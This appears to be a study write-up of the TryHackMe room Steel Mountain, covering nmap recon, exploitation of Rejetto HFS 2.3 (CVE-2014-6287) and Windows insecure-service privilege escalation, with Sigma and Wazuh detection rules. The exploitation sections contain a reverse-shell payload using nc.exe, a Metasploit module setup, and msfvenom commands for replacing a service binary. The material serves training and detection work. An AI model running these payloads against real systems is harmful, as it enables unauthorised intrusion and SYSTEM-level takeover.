# Steel Mountain — TryHackMe

> **Preparation stub.** Based on publicly documented information about this retired room — not an
> original solve, and no live flag values are recorded. Complete the bracketed fields when working
> the room under your own account. Only document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Steel Mountain |
| Difficulty | Easy–Medium |
| Category | Windows |
| Target IP | 10.x.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Windows server running **Rejetto HttpFileServer (HFS) 2.3**, vulnerable to unauthenticated remote
code execution. Exploitation gives a user shell; privilege escalation abuses an **insecure Windows
service** (identified with PowerUp) to run a malicious binary as SYSTEM. Teaches Windows
service-misconfiguration privesc, and the room is designed to be solved both with and without
Metasploit.

## Scenario value (study scaffold)

- **What it tests:** mapping a service banner (Rejetto HFS 2.3) to a known CVE, and Windows
  service-misconfiguration privilege escalation.
- **What completing it demonstrates:** both the Metasploit *and* the manual `{.exec.}` exploitation
  paths, plus PowerUp-driven privesc on an insecure/writable service binary (MITRE T1190 → T1543.003
  / T1574.009) — the room is explicitly designed to be solved both ways.

## Key vulnerability class

- **Foothold:** Rejetto **HFS 2.3** RCE via the `{.exec.}` macro in the search parameter —
  **CVE-2014-6287**. *Verify CVE when citing.*
- **Privesc:** insecure Windows **service** — commonly the bundled `AdvancedSystemCareService9`
  (Advanced SystemCare) with a **writable binary path** (and/or **unquoted service path**),
  exploitable by replacing the service executable and restarting it (CWE-732 / CWE-428 unquoted
  search path).

## 1. Reconnaissance

```
nmap -sC -sV -p- -oA nmap/steelmountain 10.x.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Note |
|------|---------|------|
| 80/tcp | http (IIS) | Landing page — image reveals an employee-of-the-month name (room hint) |
| 8080/tcp | http | **HttpFileServer 2.3 — the foothold** |
| 3389/tcp | ms-wbt-server | RDP |
| 135/139/445 | msrpc/smb | Windows services |

- Browse `:8080` and confirm the banner reads **"HttpFileServer 2.3"**. [Paste scan output on
  completion.]

**nmap flag rationale:**
- `-p-` — all 65,535 TCP ports. The HFS instance is on **8080**, not a standard web port; full-port
  scanning is what surfaces it alongside the decoy IIS site on 80.
- `-sV` — version detection. The decisive output is the banner **"HttpFileServer 2.3"** → maps
  directly to CVE-2014-6287; the version string is the whole foothold.
- `-sC` — default scripts; `http-title` and `http-server-header` confirm HFS vs IIS quickly.
- `-oA nmap/steelmountain` — keep the banner evidence.

**What to look for in the scan:** the exact string **"HttpFileServer 2.3"** (or "HFS 2.3") on the
8080 banner — that single fact is the CVE-2014-6287 trigger. Also note the port-80 landing page
whose image leaks an "employee of the month" name (a room hint, not the path). Confirm the version
before anything else; everything downstream depends on it.

## 2. Exploitation (HFS 2.3 RCE)

The foothold maps a banner to a known RCE: triggering the `{.exec.}` macro is **[ATT&CK T1190 —
Exploit Public-Facing Application]**, and the downloaded payload executing is **[ATT&CK T1059 —
Command and Scripting Interpreter]**.

**Manual path (recommended for understanding):** host a Netcat binary and a payload over a Python
web server, then trigger the `{.exec.}` macro to download and run it.

```
# attacker box
python3 -m http.server 80          # serve nc.exe
nc -lvnp 4444                       # catch the shell

# trigger via the HFS search field (URL-encoded {.exec.} payload), e.g.
#   /?search=%00{.exec|c%3A%5CWindows%5CTemp%5Cnc.exe -e cmd.exe <tun0 ip> 4444.}
```

**Metasploit path:**

```
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.x.x.x
set RPORT 8080
set LHOST <tun0 ip>
exploit
```

- **User flag:** `[capture on completion]`

## 3. Privilege escalation (insecure service)

```powershell
# upload and run PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

- PowerUp flags a service whose executable path is **writable by the current user** (and/or
  unquoted) — typically `AdvancedSystemCareService9`. Confirm with native tools:

```
sc qc AdvancedSystemCareService9          # inspect BINARY_PATH_NAME
accesschk.exe -wuvc AdvancedSystemCareService9
```

- Generate a replacement binary, overwrite the service executable, and restart the service so it
  runs the payload as **SYSTEM** **[ATT&CK T1543.003 — Create or Modify System Process: Windows
  Service; T1574.009 — Hijack Execution Flow: Unquoted/Trusted Path]**:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<tun0 ip> LPORT=5555 -f exe -o ASCService.exe
# upload over the writable path, then:
sc stop  AdvancedSystemCareService9
sc start AdvancedSystemCareService9       # service runs as SYSTEM → payload fires
```

- **Root/admin flag:** `[capture on completion]`

## 4. Tools used

| Phase | Tools |
|-------|-------|
| Recon | `nmap` (`-sC -sV -p-`) |
| Exploitation | Metasploit (`rejetto_hfs_exec`) **or** manual `{.exec.}` payload + `nc` + `python3 -m http.server` |
| Privesc enumeration | **PowerUp.ps1** (PowerSploit), `sc qc`, `accesschk` |
| Privesc exploitation | `msfvenom` (payload), `sc stop/start` |

## 5. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter | T1059 |
| Privilege Escalation | Create or Modify System Process: Windows Service | T1543.003 |
| Privilege Escalation | Hijack Execution Flow: Unquoted Path | T1574.009 |

## 6. Key learnings

- **Service-binary permissions are a top Windows privesc vector** — if a low-priv user can write the
  service's executable (or exploit an unquoted path), they can run code as SYSTEM on restart.
- **PowerUp/winPEAS pay for themselves** — automated checks surface writable services, unquoted
  paths, and `AlwaysInstallElevated` quickly; always verify a flagged finding with `sc qc` +
  `accesschk` before acting.
- **Know both routes** — Metasploit *and* a manual `{.exec.}` payload; the manual path builds
  understanding and works when Metasploit is disallowed (the room's second task explicitly asks for
  the manual solve).
- **Blue-team transfer:** MITRE **T1574.009** (unquoted path) / **T1543.003** (Windows service);
  detect via service-binary modification and unexpected service restarts. Control: restrict write
  permissions on service binaries and quote all service paths.

## 7. Defender perspective — logs & detection

What this attack looks like from a monitored SOC, and the rule that would catch it. (See
[../methodology/ctf-methodology.md §7](../methodology/ctf-methodology.md).)

**Log artefacts generated:**
- **HFS / web logs:** a request to the search endpoint containing the URL-encoded `{.exec|...}`
  macro — the literal `{.exec.}` string in a query is the exploit and never appears in normal use.
- **Process telemetry (Sysmon ID 1):** `hfs.exe` spawning `cmd.exe`/`nc.exe`/`powershell.exe`
  (the foothold), and later `services.exe` spawning the **replaced service binary** as SYSTEM (the
  privesc). The parent→child anomaly is the signal in both stages.
- **Service tampering (the strongest privesc signal):** Windows **System Event ID 7045** (a new
  service installed) and/or **7040/7036** (service start-type/state change), plus the service
  binary file being overwritten — Sysmon **Event ID 11 (FileCreate)** on the service's exe path,
  outside any patch window.
- **PowerUp/accesschk enumeration** itself spawns `powershell.exe` with suspicious reflection and
  reads service ACLs — detectable via PowerShell **Script Block Logging (Event ID 4104)**.
- **Network:** two reverse shells (user, then SYSTEM) outbound from the host.

**Example detection logic (Sigma-style):**
```yaml
title: Rejetto HFS RCE + insecure-service privesc
detection:
  rce:
    Image|endswith: '\hfs.exe'      # as ParentImage spawning a shell
    ChildImage|endswith: ['\cmd.exe', '\nc.exe', '\powershell.exe']
  service_tamper:
    EventID: [7045, 7040]           # new / modified service
  bin_overwrite:
    EventID: 11                     # Sysmon FileCreate on a service exe path
  condition: rce OR (service_tamper AND bin_overwrite)
level: critical
```

**Why it fires:** the `{.exec.}` string is unambiguously malicious in a URL, and a service binary
being overwritten then restarted (7045/7040 + FileCreate on the exe) is the textbook insecure-
service privesc — there is no legitimate workflow that rewrites a running service's executable from
a user context. Web log catches *delivery*, Event 7045 catches *escalation*. Maps to **ATT&CK
T1190 / T1059 / T1543.003 / T1574.009**.

**Defensive controls:** patch/replace Rejetto HFS; restrict write permissions on all service
binaries and their parent directories; quote all service paths; run web apps as low-privilege
accounts; alert on Event 7045 and on service-binary file modifications.

## Exam relevance — Sec+ SY0-701

| SY0-701 objective | How Steel Mountain makes it concrete |
|-------------------|--------------------------------------|
| **2.3** Vulnerability types | Vulnerable software (HFS 2.3 / Rejetto RCE) *and* a service misconfiguration (unquoted service path) — two distinct Domain 2 vulnerability categories in one box. |
| **2.4** Indicators of malicious activity | The RCE payload and the spawned reverse shell are the application-attack indicators the exam asks you to spot. |
| **2.5 / 4.1** Mitigation & hardening | Patch the vulnerable service; quote service paths and fix weak permissions — the configuration-management answers, from the attacker's side. |
| **4.x** Privilege escalation | PowerUp's discovery of the unquoted/weak-permission service is automated privesc enumeration — the practical form of the exam's host-hardening material. |

**Interview line:** "Steel Mountain is two exam concepts at once — a CVE in vulnerable software and an
unquoted-service-path misconfiguration — which is why I use it to revise why Domain 2 separates
'vulnerable software' from 'misconfiguration'."

### Wazuh detection rule (→ [watchtower](../../watchtower))

Two stages: the Rejetto HFS RCE (process anomaly) and the service-based privesc, where Windows
**Event 7045** (new service) is the high-signal artefact:

```xml
<group name="windows,sysmon,attack,">
  <!-- Stage 1: HFS spawning a shell = RCE -->
  <rule id="100470" level="13">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.parentImage" type="pcre2">\\hfs\.exe$</field>
    <field name="win.eventdata.image" type="pcre2">\\(cmd|powershell)\.exe$</field>
    <description>Rejetto HFS spawned a shell — RCE (T1190/T1059)</description>
    <mitre><id>T1190</id><id>T1059</id></mitre>
  </rule>
  <!-- Stage 2: new service installed (7045) with a binary from a temp/non-standard path -->
  <rule id="100471" level="12">
    <if_sid>61140</if_sid>   <!-- Wazuh Windows System channel: Service Control Manager 7045 -->
    <field name="win.eventdata.imagePath" type="pcre2">(?i)\\(temp|users|programdata)\\</field>
    <description>New Windows service from a non-standard path — privesc/persistence (T1543.003)</description>
    <mitre><id>T1543.003</id></mitre>
  </rule>
</group>
```
**Validation:** exploit HFS in the lab and confirm 100470; replace the unquoted/writable service
binary and confirm the 7045-derived 100471. Sub-techniques: **T1190**, **T1543.003** (Windows
service), **T1574.009** (unquoted service path), **T1059** (command execution).

## 8. References

- Rejetto HFS 2.3 CVE-2014-6287 (verify before citing).
- PowerSploit / PowerUp documentation; unquoted-service-path guidance.
- MITRE ATT&CK T1190, T1059, T1543.003, T1574.009.
